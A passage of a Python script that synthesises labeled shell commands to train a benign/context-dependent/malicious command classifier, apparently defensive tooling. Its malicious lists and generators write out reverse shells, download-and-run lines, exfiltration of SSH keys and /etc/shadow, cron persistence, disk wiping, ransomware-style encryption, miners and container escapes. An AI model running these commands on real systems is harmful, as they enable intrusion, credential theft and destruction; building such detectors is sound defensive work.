    "timestomp /tmp/backdoor -m '2020-01-01 00:00:00'",
    "touch -t 202001010000 /tmp/backdoor",
    "mv /tmp/malware /usr/lib/libpam.so.1",

    # --- Lateral movement ---
    "ssh -o StrictHostKeyChecking=no root@10.0.0.2 'curl http://10.0.0.1/shell|bash'",
    "sshpass -p 'password123' ssh root@10.0.0.2",
    "for i in $(seq 1 254); do ssh -o ConnectTimeout=1 root@10.0.0.$i 'id' 2>/dev/null; done",
    "psexec.py admin:password@10.0.0.2",
    "wmiexec.py admin:password@10.0.0.2",
    "evil-winrm -i 10.0.0.2 -u admin -p password",
    "crackmapexec ssh 10.0.0.0/24 -u admin -p password",
    "ansible all -i '10.0.0.2,' -m shell -a 'curl http://10.0.0.1/shell|bash'",

    # --- Discovery (attacker intent) ---
    "cat /etc/passwd | cut -d: -f1",
    "for user in $(cat /etc/passwd | cut -d: -f1); do crontab -l -u $user 2>/dev/null; done",
    "cat /etc/hosts | grep -v '^#'",
    "arp -a && ip neigh && cat /proc/net/arp",
    "cat /proc/net/fib_trie | grep -o '[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+'",
    "for port in $(seq 1 65535); do echo 2>/dev/null > /dev/tcp/10.0.0.1/$port && echo $port open; done",
    "ls -la /home/*/.ssh/ 2>/dev/null",
    "cat /home/*/.ssh/id_rsa 2>/dev/null",
    "find / -name '*.kdbx' 2>/dev/null",
    "find / -name '*.pgpass' 2>/dev/null",
    "cat /proc/version && uname -a && cat /etc/os-release",
    "dpkg -l | grep -i 'linux-image\\|sudo\\|docker\\|lxc'",
    "getcap -r / 2>/dev/null",
    "cat /etc/fstab | grep -v '^#'",

    # --- Destruction / impact ---
    "rm -rf / --no-preserve-root",
    "rm -rf /home/ /var/ /etc/",
    ":(){ :|:& };:",  # fork bomb
    "dd if=/dev/urandom of=/dev/sda bs=4M",
    "shred -vfz -n 5 /dev/sda",
    "echo 'c' > /proc/sysrq-trigger",
    "vssadmin delete shadows /all /quiet",
    "wbadmin delete systemstatebackup -keepVersions:0",
    "openssl enc -aes-256-cbc -salt -in /home/user/important.doc -out /home/user/important.doc.enc -k ransomkey && rm /home/user/important.doc",
    "find /home -type f -name '*.doc' -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k ransomkey \\; -exec rm {} \\;",

    # --- Crypto mining ---
    "curl -s http://pool.minergate.com/dkjdjkj/xmrig -o /tmp/.xmrig && chmod +x /tmp/.xmrig && /tmp/.xmrig -o stratum+tcp://pool.minexmr.com:4444 -u wallet -p x",
    "wget -q http://dl.xmrig.com/xmrig -O /dev/shm/.proc && nohup /dev/shm/.proc --donate-level 0 -o pool.hashvault.pro:80 &",
    "docker run -d --name helper --restart=always xmrig/xmrig -o pool.minexmr.com:4444",

    # --- Container escape ---
    "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
    "docker run -v /:/host --privileged -it alpine chroot /host /bin/bash",
    "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker exec -it $(docker ps -q) bash",
    "mount /dev/sda1 /mnt && chroot /mnt /bin/bash",

    # --- Kernel exploitation ---
    "insmod /tmp/rootkit.ko",
    "echo 0 > /proc/sys/kernel/modules_disabled && insmod /tmp/evil.ko",
    "echo 'kernel.core_pattern=|/tmp/exploit' > /etc/sysctl.d/99-exploit.conf",
]


# ---------------------------------------------------------------------------
# Variation engine: inject realistic noise / parameter diversity
# ---------------------------------------------------------------------------

_IPS = [
    "10.0.0.1", "10.0.0.5", "10.10.14.3", "10.10.14.5",
    "192.168.1.1", "192.168.1.100", "192.168.1.50", "192.168.0.10",
    "172.16.0.1", "172.16.0.50", "172.16.5.10",
    "10.20.30.40", "10.100.200.1", "192.168.56.1",
]

_PORTS = ["4444", "4443", "9001", "9090", "1337", "8080", "8443", "1234", "5555", "6666", "7777", "31337"]

_PATHS = ["/tmp", "/dev/shm", "/var/tmp", "/run/shm", "/tmp/.hidden", "/dev/shm/.proc"]

_USERS = ["root", "admin", "user", "www-data", "deploy", "ubuntu", "ec2-user", "operator"]

_BENIGN_PATHS = [
    "/var/log", "/home/user", "/opt/app", "/srv/www", "/var/www/html",
    "/etc/nginx", "/home/deploy", "/usr/local/bin", "/tmp", "/var/lib",
    "/home/user/projects", "/opt/services", "/var/www", "/home/admin",
]

_BENIGN_FILES = [
    "config.yaml", "settings.json", "app.py", "server.js", "main.go",
    "index.html", "nginx.conf", "docker-compose.yml", "Makefile",
    "README.md", "requirements.txt", "package.json", "Dockerfile",
    "deploy.sh", "backup.sh", "monitor.py", "healthcheck.sh",
]

_BENIGN_SERVICES = [
    "nginx", "apache2", "httpd", "postgresql", "mysql", "redis",
    "docker", "sshd", "cron", "rsyslog", "fail2ban", "grafana-server",
    "prometheus", "elasticsearch", "kibana", "logstash", "consul",
    "vault", "nomad", "haproxy", "memcached", "rabbitmq-server",
]

_BENIGN_PACKAGES = [
    "flask", "django", "fastapi", "gunicorn", "uvicorn", "celery",
    "numpy", "pandas", "requests", "boto3", "sqlalchemy", "redis",
    "express", "react", "next", "typescript", "webpack", "lodash",
]


def _vary_ip(cmd: str) -> List[str]:
    """Generate command variants with different IPs."""
    results = []
    for ip in random.sample(_IPS, min(3, len(_IPS))):
        for orig_ip in _IPS[:4]:
            if orig_ip in cmd:
                results.append(cmd.replace(orig_ip, ip))
                break
    return results


def _vary_port(cmd: str) -> List[str]:
    results = []
    for port in random.sample(_PORTS, min(2, len(_PORTS))):
        for orig_port in _PORTS[:3]:
            if orig_port in cmd:
                results.append(cmd.replace(orig_port, port))
                break
    return results


def _generate_benign_variations() -> List[str]:
    """Generate additional benign command variations with realistic parameters."""
    extra = []

    # ls variations across common paths
    for p in _BENIGN_PATHS:
        extra.append(f"ls -la {p}")
        extra.append(f"ls -lah {p}")
        extra.append(f"ls {p}/")
        extra.append(f"ls -lt {p} | head -10")

    # cat/head/tail on common config files
    for p in ["/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf",
              "/etc/mysql/my.cnf", "/etc/redis/redis.conf",
              "/etc/postgresql/14/main/pg_hba.conf"]:
        extra.append(f"cat {p}")
        extra.append(f"head -50 {p}")
        extra.append(f"tail -20 {p}")
        extra.append(f"grep -v '^#' {p}")

    # Service management with various services
    for svc in _BENIGN_SERVICES:
        extra.append(f"systemctl status {svc}")
        extra.append(f"systemctl restart {svc}")
        extra.append(f"systemctl is-active {svc}")
        extra.append(f"journalctl -u {svc} --no-pager -n 20")
        extra.append(f"journalctl -u {svc} --since '1 hour ago'")

    # Docker with realistic container names
    for name in ["web", "api", "db", "cache", "worker", "proxy", "app"]:
        extra.append(f"docker logs {name}")
        extra.append(f"docker logs -f {name}")
        extra.append(f"docker logs --tail 200 {name}")
        extra.append(f"docker restart {name}")
        extra.append(f"docker exec {name} ls /app")
        extra.append(f"docker exec -it {name} bash")
        extra.append(f"docker inspect {name}")

    # Process hunting (admin troubleshooting)
    for proc in ["nginx", "python", "java", "node", "postgres", "mysql", "redis", "gunicorn"]:
        extra.append(f"ps aux | grep {proc}")
        extra.append(f"pgrep -la {proc}")
        extra.append(f"pidof {proc}")
        extra.append(f"kill -HUP $(pidof {proc})")

    # File operations with realistic paths
    for f in _BENIGN_FILES:
        for p in random.sample(_BENIGN_PATHS, 3):
            extra.append(f"cp {p}/{f} {p}/{f}.bak")
            extra.append(f"mv {p}/{f}.old {p}/{f}")
            extra.append(f"vim {p}/{f}")
            extra.append(f"nano {p}/{f}")

    # pip / npm with packages
    for pkg in _BENIGN_PACKAGES:
        extra.append(f"pip install {pkg}")
        extra.append(f"pip install --upgrade {pkg}")
        extra.append(f"pip show {pkg}")

    # Disk usage checks
    for p in _BENIGN_PATHS:
        extra.append(f"du -sh {p}")
        extra.append(f"du -ah {p} | sort -rh | head -10")
        extra.append(f"df -h {p}")

    # Grep for debugging (benign intent)
    for pattern in ["ERROR", "WARN", "Exception", "traceback", "failed", "timeout", "refused"]:
        extra.append(f"grep -i '{pattern}' /var/log/syslog")
        extra.append(f"grep -i '{pattern}' /var/log/nginx/error.log")
        extra.append(f"grep -c '{pattern}' /var/log/syslog")

    # SSH to internal hosts (normal admin)
    for user in ["deploy", "admin", "ubuntu"]:
        for host in ["web-01", "db-01", "app-01", "staging", "production"]:
            extra.append(f"ssh {user}@{host}")
            extra.append(f"ssh {user}@{host} 'uptime'")

    # Chmod/chown ops
    for mode in ["644", "755", "600", "700", "664"]:
        for f in random.sample(_BENIGN_FILES, 3):
            extra.append(f"chmod {mode} {f}")

    for user in ["www-data", "deploy", "root", "nginx"]:
        for p in random.sample(_BENIGN_PATHS, 3):
            extra.append(f"chown {user}:{user} {p}")
            extra.append(f"chown -R {user}:{user} {p}")

    # Networking tools (benign monitoring)
    for host in ["google.com", "8.8.8.8", "internal-dns", "lb-01", "api.company.com"]:
        extra.append(f"ping -c 4 {host}")
        extra.append(f"dig {host}")
        extra.append(f"nslookup {host}")
        extra.append(f"traceroute {host}")
        extra.append(f"curl -I https://{host}")

    # md5sum / sha256sum (integrity checking, not hacking)
    for f in ["backup.tar.gz", "release.zip", "image.iso", "package.deb", "firmware.bin"]:
        extra.append(f"md5sum {f}")
        extra.append(f"sha256sum {f}")
        extra.append(f"sha256sum -c checksums.txt")

    return extra


def _generate_context_dependent_variations() -> List[str]:
    """Generate additional context-dependent variations."""
    extra = []

    # Scanning variations
    for net in ["192.168.1.0/24", "10.0.0.0/24", "172.16.0.0/24", "10.10.10.0/24"]:
        extra.append(f"nmap -sn {net}")
        extra.append(f"nmap -sT {net}")
        extra.append(f"nmap -sV {net}")

    for ip in random.sample(_IPS, 5):
        extra.append(f"nmap -p 22,80,443 {ip}")
        extra.append(f"nmap -sV {ip}")
        extra.append(f"nc -zv {ip} 22")
        extra.append(f"nc -zv {ip} 80")
        extra.append(f"nc -zv {ip} 1-1000")

    # Password/secret grepping (could be audit or theft)
    for dir_path in ["/etc", "/var/www", "/opt", "/home", "/srv"]:
        extra.append(f"grep -r 'password' {dir_path}/")
        extra.append(f"grep -ri 'secret' {dir_path}/")
        extra.append(f"grep -ri 'api_key' {dir_path}/")
        extra.append(f"grep -ri 'token' {dir_path}/")

    # Listener variations (pentest vs attack)
    for port in _PORTS:
        extra.append(f"nc -lvnp {port}")
        extra.append(f"ncat -lvnp {port}")
        extra.append(f"socat TCP-LISTEN:{port},fork -")

    # Python http server (dev vs staging attack)
    for port in ["8000", "8080", "80", "8888", "9000"]:
        extra.append(f"python3 -m http.server {port}")
        extra.append(f"python -m SimpleHTTPServer {port}")

    # SSH tunneling
    for port in ["1080", "8080", "3306", "5432", "6379"]:
        extra.append(f"ssh -D {port} user@server")
        extra.append(f"ssh -L {port}:localhost:{port} user@jump")
        extra.append(f"ssh -R {port}:localhost:{port} user@external")

    # Encoding operations
    extra.extend([
        "echo 'test payload' | base64",
        "echo 'sensitive data' | base64",
        "cat /etc/hostname | base64",
        "python3 -c 'import base64; print(base64.b64encode(b\"test\"))'",
        "openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc",
    ])

    return extra


def _generate_malicious_variations() -> List[str]:
    """Generate malicious command variants with IP/port/path diversity."""
    extra = []

    # Reverse shell variations with different IPs and ports
    shells_templates = [
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc -e /bin/bash {ip} {port}",
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
    ]

    for tmpl in shells_templates:
        for _ in range(5):
            ip = random.choice(_IPS)
            port = random.choice(_PORTS)
            extra.append(tmpl.format(ip=ip, port=port))

    # Download+execute with variations
    for _ in range(15):
        ip = random.choice(_IPS)
        port = random.choice(["8080", "80", "443", "8443", "9090"])
        path = random.choice(_PATHS)
        payload = random.choice(["shell.sh", "payload.sh", "implant", "dropper", "agent", "beacon.sh", "rev.py"])
        extra.append(f"curl http://{ip}:{port}/{payload} | bash")
        extra.append(f"wget http://{ip}:{port}/{payload} -O {path}/{payload} && chmod +x {path}/{payload} && {path}/{payload}")
        extra.append(f"curl -s http://{ip}/{payload} -o {path}/.{payload} && bash {path}/.{payload}")

    # Exfiltration with variations
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/ssh/sshd_config",
        "/root/.ssh/id_rsa", "/root/.bash_history",
        "/var/www/html/.env", "/opt/app/.env",
        "/home/user/.ssh/id_rsa", "/etc/sudoers",
    ]
    for _ in range(15):
        ip = random.choice(_IPS)
        port = random.choice(_PORTS)
        src = random.choice(sensitive_files)
        extra.append(f"curl -X POST -d @{src} http://{ip}:{port}/exfil")
        extra.append(f"cat {src} | nc {ip} {port}")
        extra.append(f"base64 {src} | curl -d @- http://{ip}:{port}/")

    # Persistence with variations
    for _ in range(10):
        ip = random.choice(_IPS)
        port = random.choice(_PORTS)
        path = random.choice(_PATHS)
        extra.append(f"(crontab -l; echo '*/5 * * * * curl http://{ip}/{port}/beacon | bash') | crontab -")
        extra.append(f"echo '{path}/.implant &' >> /etc/rc.local")
        extra.append(f"cp {path}/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update")

    return extra


# ---------------------------------------------------------------------------
# Main: assemble, deduplicate, and write CSVs
# ---------------------------------------------------------------------------

def deduplicate(commands: List[Tuple[str, str, str, str]]) -> List[Tuple[str, str, str, str]]:
    """Deduplicate by normalized command text."""
    seen = set()
    unique = []
    for row in commands:
        key = hashlib.md5(row[0].strip().lower().encode()).hexdigest()
        if key not in seen:
            seen.add(key)
            unique.append(row)
    return unique


def main():
    print("[*] Synthesizing adversarial training data for Gatekeeper 3-class model...")

    all_rows: List[Tuple[str, str, str, str]] = []  # (command, label, original_label, mitre_id)

    # 1. Adversarial benign
    benign_base = (
        _SYSINFO_BENIGN + _NETWORK_BENIGN + _LOGCONFIG_BENIGN +
        _PROCESS_BENIGN + _FILEPERM_BENIGN + _SERVICE_BENIGN +
        _DISK_BENIGN + _DOCKER_BENIGN + _GIT_BENIGN +
        _PACKAGE_BENIGN + _BUILD_BENIGN + _BACKUP_BENIGN +
        _AUTH_BENIGN + _FIND_BENIGN + _MISC_BENIGN
    )
    benign_varied = _generate_benign_variations()
    all_benign = benign_base + benign_varied
    for cmd in all_benign:
        all_rows.append((cmd, "Benign", "Synthetic", "Synthetic"))

    # 2. Context-dependent
    ctx_base = _CONTEXT_DEPENDENT
    ctx_varied = _generate_context_dependent_variations()
    all_ctx = ctx_base + ctx_varied
    for cmd in all_ctx:
        all_rows.append((cmd, "Context_Dependent", "Synthetic", "Synthetic"))

    # 3. Malicious
    mal_base = _MALICIOUS
    mal_varied = _generate_malicious_variations()
    all_mal = mal_base + mal_varied
    for cmd in all_mal:
        all_rows.append((cmd, "Malicious", "Synthetic", "Synthetic"))

    # Deduplicate
    all_rows = deduplicate(all_rows)
    random.shuffle(all_rows)

    # Count by class
    from collections import Counter
    counts = Counter(r[1] for r in all_rows)
    print(f"[+] Synthesized data (deduplicated):")
    for cls in ["Benign", "Malicious", "Context_Dependent"]:
        print(f"    {cls}: {counts.get(cls, 0)}")
    print(f"    Total: {len(all_rows)}")

    # Split 80/10/10
    n = len(all_rows)
    train_end = int(n * 0.80)
    val_end = int(n * 0.90)
    train_rows = all_rows[:train_end]
    val_rows = all_rows[train_end:val_end]
    test_rows = all_rows[val_end:]

    for split_name, rows in [("train", train_rows), ("val", val_rows), ("test", test_rows)]:
        sc = Counter(r[1] for r in rows)
        print(f"    {split_name}: {sum(sc.values())} ({', '.join(f'{k}={v}' for k,v in sc.most_common())})")

    # Write synthetic-only CSVs
    out_dir = Path(__file__).resolve().parent / "genos_dataset"
    out_dir.mkdir(parents=True, exist_ok=True)

    for split_name, rows in [("train", train_rows), ("val", val_rows), ("test", test_rows)]:
        out_path = out_dir / f"synthetic_gatekeeper_{split_name}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["command", "label", "original_label", "mitre_id"])
            for row in rows:
                writer.writerow(row)
        print(f"[+] Wrote {out_path} ({len(rows)} rows)")

    # Merge with existing datasets
    for split_name, synth_rows in [("train", train_rows), ("val", val_rows), ("test", test_rows)]:
        orig_path = out_dir / f"gatekeeper_3class_{split_name}.csv"
        merged_path = out_dir / f"gatekeeper_3class_{split_name}_augmented.csv"

        # Read original
        orig_rows = []
        with open(orig_path, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            for row in reader:
                orig_rows.append((row["command"], row["label"], row["original_label"], row["mitre_id"]))

        # Merge and deduplicate
        combined = orig_rows + synth_rows
        combined = deduplicate(combined)
        random.shuffle(combined)

        with open(merged_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["command", "label", "original_label", "mitre_id"])
            for row in combined:
                writer.writerow(row)

        orig_count = len(orig_rows)
        merged_count = len(combined)
        added = merged_count - orig_count
        mc = Counter(r[1] for r in combined)
        print(f"[+] Merged {split_name}: {orig_count} original + {added} new = {merged_count} total")
        print(f"    Distribution: {', '.join(f'{k}={v}' for k,v in mc.most_common())}")

    print("\n[+] Synthesis complete. Augmented datasets ready for training.")
    print("[*] To train: python scripts/training/trainer1.py with augmented CSVs")


if __name__ == "__main__":
    main()
